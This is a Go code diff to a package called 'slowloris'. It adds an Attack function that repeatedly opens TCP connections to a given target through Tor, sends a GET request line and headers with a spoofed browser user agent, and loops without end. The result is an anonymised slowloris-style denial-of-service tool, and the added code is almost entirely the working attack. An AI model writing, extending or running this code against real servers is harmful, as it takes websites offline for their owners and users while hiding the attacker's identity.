@@ -3,6 +3,8 @@ package slowloris
 import (
 	"bytes"
 	"context"
+	"fmt"
+	"net"
 	"net/http"
 	"strings"
 	"time"
@@ -21,8 +23,9 @@ func NewClient() (*Client, error) {
 }
 
 type Client struct {
-	tor        *tor.Tor
+	Tor        *tor.Tor
 	HTTP       *http.Client
+	Dialer     *tor.Dialer
 	dialCancel context.CancelFunc
 }
 
@@ -32,7 +35,7 @@ func (c *Client) startup() error {
 		return err
 	}
 
-	c.tor = t
+	c.Tor = t
 
 	dialCtx, dialCancel := context.WithTimeout(context.Background(), time.Minute)
 	if err != nil {
@@ -42,15 +45,46 @@ func (c *Client) startup() error {
 
 	c.dialCancel = dialCancel
 
-	dialer, err := c.tor.Dialer(dialCtx, nil)
+	dialer, err := c.Tor.Dialer(dialCtx, nil)
 	if err != nil {
 		dialCancel()
 		return err
 	}
 
+	c.Dialer = dialer
+
 	c.HTTP = &http.Client{Transport: &http.Transport{DialContext: dialer.DialContext}}
 
 	return nil
+}
+
+func (c *Client) Attack(target string) {
+	var conn net.Conn
+
+	for {
+		if conn != nil {
+			conn.Close()
+		}
+
+		conn, err := c.Dialer.Dial("tcp", target)
+		if err != nil {
+			logging.Error(err.Error())
+			continue
+		}
+
+		if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", "GET", "/"); err != nil {
+			logging.Error(err.Error())
+			continue
+		}
+
+		header := createHeader(target)
+		if err = header.Write(conn); err != nil {
+			logging.Error(err.Error())
+			continue
+		}
+
+		time.Sleep(500)
+	}
 }
 
 func (c *Client) CheckTorConnection() bool {
@@ -74,7 +108,7 @@ func (c *Client) Close() {
 	if c.dialCancel != nil {
 		c.dialCancel()
 	}
-	c.tor.Close()
+	c.Tor.Close()
 }
 
 func getTitle(n *html.Node) string {
@@ -91,4 +125,13 @@ func getTitle(n *html.Node) string {
 		}
 	}
 	return ""
+}
+
+func createHeader(target string) *http.Header {
+	hdr := http.Header{}
+
+	hdr.Add("Host", target)
+	hdr.Add("User-Agent", "Mozilla/5.0 (Android 4.4; Tablet; rv:41.0) Gecko/41.0 Firefox/41.0")
+
+	return &hdr
 }
